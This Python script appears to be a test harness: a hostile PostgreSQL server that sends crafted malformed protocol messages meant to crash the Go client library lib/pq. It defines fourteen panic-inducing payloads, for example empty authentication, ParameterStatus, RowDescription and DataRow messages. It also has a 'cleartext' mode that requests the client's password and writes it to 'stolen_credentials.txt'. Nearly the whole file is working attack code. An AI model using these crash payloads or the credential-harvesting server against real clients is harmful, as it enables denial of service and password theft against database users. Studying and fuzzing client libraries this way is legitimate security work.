"""Hostile PostgreSQL server: sends crafted malformed messages to crash lib/pq.

Startup-stage modes (single crafted reply to the startup packet):
  auth_empty    R len=4            -> auth() int32() on empty buf      (buf.go panic)
  auth_short    R len=5, 1 byte    -> int32() reads 4 from 1           (index panic)
  ps_empty      S len=4            -> processParameterStatus string()  (buf.go:37 panic)
  ps_nonull     S len=5, "A"       -> string() missing terminator       (buf.go:37 panic)
  rfq_empty     Z len=4            -> processReadyForQuery byte()      (slice panic)
  key_empty     K len=4            -> BackendKeyData int32()           (index panic)
  notif_empty   A len=4            -> recvNotification int32()         (index panic)
  err_nonull    E len=8, "AAAA"    -> parseError string() no NUL       (buf.go:37 panic)
  neg_empty     v len=4            -> NegotiateProtocolVersion int32() (index panic)
  notice_empty  N len=4            -> parseError byte() on empty       (slice panic)

Post-startup modes (complete handshake, then crafted reply to the client query):
  cc_empty      C len=4            -> parseComplete string()           (buf.go:37 panic)
  rd_empty      T len=4            -> parseRowDescribe int16()         (index panic)
  qbool         T bool col + D empty value -> textDecode s[0]          (encode.go:118 panic)
  qbin          T int8 bin col + D 2-byte value -> binaryDecode Uint64 (index panic)
  ok            I + Z              -> clean success (harness control)
  cleartext     R auth-cleartext   -> harvests the client's password

Usage: python3 panic_server.py <mode> [port]
"""
import socket
import struct
import sys
import threading
import time

MODE = sys.argv[1] if len(sys.argv) > 1 else "auth_empty"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 5433

AUTH_OK = b"R\x00\x00\x00\x08\x00\x00\x00\x00"
AUTH_CLEARTEXT = b"R\x00\x00\x00\x08\x00\x00\x00\x03"
RFQ_IDLE = b"Z\x00\x00\x00\x05I"
EMPTY_QUERY = b"I\x00\x00\x00\x04"


def rowdesc(typoid, typlen, fmt):
    # 1 column "b", tableoid=0, attnum=1, typmod=-1
    body = (struct.pack(">h", 1) + b"b\x00" + struct.pack(">I", 0)
            + struct.pack(">h", 1) + struct.pack(">I", typoid)
            + struct.pack(">h", typlen) + struct.pack(">i", -1)
            + struct.pack(">h", fmt))
    return b"T" + struct.pack(">I", len(body) + 4) + body


def datarow(value):
    body = struct.pack(">h", 1) + struct.pack(">i", len(value)) + value
    return b"D" + struct.pack(">I", len(body) + 4) + body


STARTUP_MODES = {
    "auth_empty": b"R\x00\x00\x00\x04",
    "auth_short": b"R\x00\x00\x00\x05\x00",
    "ps_empty": b"S\x00\x00\x00\x04",
    "ps_nonull": b"S\x00\x00\x00\x05A",
    "rfq_empty": b"Z\x00\x00\x00\x04",
    "key_empty": b"K\x00\x00\x00\x04",
    "notif_empty": b"A\x00\x00\x00\x04",
    "err_nonull": b"E\x00\x00\x00\x08AAAA",
    "neg_empty": b"v\x00\x00\x00\x04",
    "notice_empty": b"N\x00\x00\x00\x04",
}

POST_MODES = {
    "cc_empty": b"C\x00\x00\x00\x04",
    "rd_empty": b"T\x00\x00\x00\x04",
    "qbool": rowdesc(16, 1, 0) + datarow(b""),          # bool, text, empty value
    "qbin": rowdesc(20, 8, 1) + datarow(b"\x00\x01"),   # int8, binary, 2 bytes
    "ok": EMPTY_QUERY + RFQ_IDLE,
}


def recv_startup(c):
    c.settimeout(15)
    try:
        return c.recv(4096)
    except socket.timeout:
        return b""


def handle(c):
    try:
        data = recv_startup(c)
        if MODE in STARTUP_MODES:
            c.sendall(STARTUP_MODES[MODE])
            time.sleep(2)
            return
        if MODE == "cleartext":
            c.sendall(AUTH_CLEARTEXT)
            try:
                cred = c.recv(4096)
            except socket.timeout:
                cred = b""
            with open("stolen_credentials.txt", "a") as f:
                f.write("%s mode=cleartext len=%d hex=%s repr=%r\n"
                        % (time.strftime("%H:%M:%S"), len(cred), cred[:48].hex(), cred[:80]))
            c.sendall(AUTH_OK + RFQ_IDLE)
            time.sleep(2)
            return
        # post-startup: handshake first
        c.sendall(AUTH_OK + RFQ_IDLE)
        try:
            q = c.recv(4096)  # client's Query
        except socket.timeout:
            q = b""
        with open("post_queries.log", "a") as f:
            f.write("%s mode=%s qlen=%d\n" % (time.strftime("%H:%M:%S"), MODE, len(q)))
        c.sendall(POST_MODES[MODE])
        time.sleep(2)
    except Exception:
        pass
    finally:
        try:
            c.close()
        except OSError:
            pass


srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("127.0.0.1", PORT))
srv.listen(16)
print("panic_server mode=%s on 127.0.0.1:%d" % (MODE, PORT), flush=True)
while True:
    conn, _ = srv.accept()
    threading.Thread(target=handle, args=(conn,), daemon=True).start()
